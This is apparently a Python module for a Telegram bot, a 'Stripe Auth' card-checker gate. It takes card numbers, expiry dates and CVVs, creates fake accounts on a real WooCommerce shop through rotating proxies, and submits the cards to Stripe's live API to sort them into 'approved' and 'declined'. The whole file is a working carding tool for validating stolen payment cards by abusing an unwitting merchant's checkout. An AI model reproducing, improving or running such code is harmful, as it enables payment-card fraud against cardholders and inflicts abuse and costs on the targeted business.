import requests as r 
from src.extras.check import makeGate
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
import string, random, time, rsa, base64, names, json

BIN_API = "https://bins.antipublic.cc/bins/"
name_gate = "Stripe_Auth"
subtype = "Stripe Auth"
command = "st"


@Client.on_message(filters.command([f"{name_gate}", f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False))
async def gateway(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    cc_check = await get_live(card, msg) 


async def get_live(card, msg):

    initial_time = time.time()
    BIN = card[0:6]
    data_bin = r.get(BIN_API+BIN).json()

    

    card_splited = makeGate.split_card(card) 
    ccnum = card_splited[0]
    mes = card_splited[1]
    ano = card_splited[2]
    if len(ano) == 4:
        ano = ano[2:4]
    cvv = card_splited[3] 


    current_time = datetime.now().strftime("%D - %H:%M:%S")
    email = f"{names.get_first_name()}{names.get_last_name()}%40gmail.com"

    proxies = makeGate.load_proxies("src/extras/proxies.txt")
    proxy = random.choice(proxies)
    session = r.Session()
    SessionId = makeGate.session_id()

    initial_time = time.time()
    BIN = card[0:6]
    data_bin = r.get(BIN_API+BIN).json()

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ REQ GUID, SID and MUID ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }


    response = r.post('https://m.stripe.com/6', headers=headers).json()
    muid = response['muid']
    guid = response['guid']
    sid = response['sid']
        

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'authority': 'www.sohoskinmanagement.com.au',
        'accept-language': 'en-US,en;q=0.9',
        'sec-fetch-mode': 'navigate',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    
    response = session.get('https://www.sohoskinmanagement.com.au/my-account', headers=headers).text
    register = makeGate.getStr(response, 'name="woocommerce-register-nonce" value="', '"')

    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['brand']}</code> - <code>{data_bin['type']}</code> - <code>{data_bin['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['country_name']} {data_bin['country_flag']}</code>"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'authority': 'www.sohoskinmanagement.com.au',
        'origin': 'https://www.sohoskinmanagement.com.au',
        'referer': 'https://www.sohoskinmanagement.com.au/my-account/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = {
        'billing_phone': '2486354657',
        'billing_first_name': 'Andres',
        'billing_last_name': 'Bermudez',
        'email': email,
        'woocommerce-register-nonce': register,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    
    response = session.post('https://www.sohoskinmanagement.com.au/my-account/', headers=headers, data=data)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'authority': 'www.sohoskinmanagement.com.au',
        'referer': 'https://www.sohoskinmanagement.com.au/my-account/payment-methods/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    response = session.get(
                'https://www.sohoskinmanagement.com.au/my-account/add-payment-method/',
                headers=headers,
    ).text
                
    nonce = makeGate.getStr(response, '"add_card_nonce":"', '"')

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = f'type=card&billing_details[name]=+&billing_details[email]={email}&card[number]={ccnum}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F3315d1529b%3B+stripe-js-v3%2F3315d1529b%3B+split-card-element&referrer=https%3A%2F%2Fwww.sohoskinmanagement.com.au&time_on_page=27025&key=pk_live_51HwHjKFXkfhhPzHQhhMg62G1UREU2LM3R4kxtUnexOpqiUCzYYevbwNWA3zi2luMygnuuaEMqfHoe9eIoyp5spcn00egMZE2Z7'

    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).text
            
    id_ = makeGate.getStr(response, '"id": "', '"')
    if "None" in id_:
        msgx = "DECLINED ❌"
        respuesta = "Card number incorrect."


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fifth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'authority': 'www.sohoskinmanagement.com.au',
        'origin': 'https://www.sohoskinmanagement.com.au',
        'referer': 'https://www.sohoskinmanagement.com.au/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
    }

    data = {
        'stripe_source_id': id_,
        'nonce': nonce,
    }

                
    response = session.post('https://www.sohoskinmanagement.com.au/', params=params, headers=headers, data=data)
    code = makeGate.getStr(response.text, '"message":"', '"')


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Response Code ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    if int(response.find('"status":"success"')) > 0 :
            msgx = "APPROVED AUTH✅"
            respuesta = "APPROVED"
            
    elif int(response.find('requires_action')) > 0 :
            msgx = "DECLINED 3D❌"
            respuesta = "3D Required"
            
    elif "Your card has insufficient funds." in code:
            respuesta = code
            msgx = "APPROVED CVV✅"
            
    elif "Your card's security code is incorrect." in code:
            respuesta = code
            msgx = "APPROVED CCN✅"
        
    else:
            respuesta = code
            msgx = "DECLINED ❌"


    data = r.get(BIN_API+BIN).json()
    final_time = time.time() - initial_time

    card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccnum}:{mes}:{ano}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b> 
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {respuesta}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
s<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
    await msg.edit_text(card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)